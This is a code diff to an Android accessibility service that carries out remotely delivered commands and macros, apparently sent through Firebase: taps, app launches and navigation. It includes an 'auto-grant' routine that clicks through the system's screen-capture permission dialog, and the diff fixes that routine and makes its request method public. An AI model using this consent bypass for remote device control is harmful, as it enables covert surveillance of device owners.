@@ -49,18 +49,17 @@ class MyAccessibilityService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    // ---------- MACRO EXECUTION (stays on main thread) ----------
+    // ---------- MACRO EXECUTION ----------
     data class MacroStep(val type: String, val data: Any? = null, val retry: Int = 3)
 
     fun executeMacro(macroId: String, rawSteps: List<Map<String, Any>>) {
         val steps = rawSteps.mapNotNull { step ->
-            val type = step["type"] as? String ?: null
+            val type = step["type"] as? String ?: return@mapNotNull null
             val data = step["data"]
             val retry = (step["retry"] as? Int) ?: 3
-            if (type != null) MacroStep(type, data, retry) else null
+            MacroStep(type, data, retry)
         }
 
-        // Run on a background thread to avoid blocking Firebase listener, but dispatch each step to main thread
         object : Thread() {
             override fun run() {
                 var idx = 0
@@ -98,7 +97,7 @@ class MyAccessibilityService : AccessibilityService() {
                 latch.countDown()
             }
         }
-        latch.await()   // wait for main thread to execute
+        latch.await()
         return result
     }
 
@@ -129,10 +128,7 @@ class MyAccessibilityService : AccessibilityService() {
                 val pkg = step.data as? String ?: return false
                 launchApp(pkg)
             }
-            "wait" -> {
-                // already waited on background thread, but this step can just be a placeholder
-                true
-            }
+            "wait" -> true  // wait was already done on background thread
             "home" -> {
                 performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                 true
@@ -149,11 +145,11 @@ class MyAccessibilityService : AccessibilityService() {
         val intent = packageManager.getLaunchIntentForPackage(pkg) ?: return false
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(intent)
-        Thread.sleep(2000)   // allow time for app to open (still on background thread, fine)
+        Thread.sleep(2000)
         return true
     }
 
-    // ---------- DIRECT COMMANDS (called from Firebase main thread) ----------
+    // ---------- DIRECT COMMANDS ----------
     fun tap(x: Int, y: Int) {
         val path = Path().apply { moveTo(x.coerceIn(0, 9999).toFloat(), y.coerceIn(0, 9999).toFloat()) }
         dispatchGesture(GestureDescription.Builder()
@@ -215,7 +211,7 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     // ---------- SCREEN CAPTURE AUTO‑GRANT ----------
-    private fun requestScreenCapture() {
+    fun requestScreenCapture() {   // <-- now public
         startActivity(Intent(this, ScreenPermissionActivity::class.java).apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK })
     }
 
@@ -227,11 +223,13 @@ class MyAccessibilityService : AccessibilityService() {
             for (node in root.findAccessibilityNodeInfosByViewId(id))
                 if (node.isClickable) { node.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
         }
-        // Fallback: click any button with "start" in description
+        // Fallback: iterate children of the window's root node correctly
         val windowRoot = root.window?.root ?: return
-        for (child in windowRoot) {
+        for (i in 0 until windowRoot.childCount) {
+            val child = windowRoot.getChild(i) ?: continue
             if (child.contentDescription?.contains("start", ignoreCase = true) == true && child.isClickable) {
-                child.performAction(AccessibilityNodeInfo.ACTION_CLICK); break
+                child.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                break
             }
         }
     }
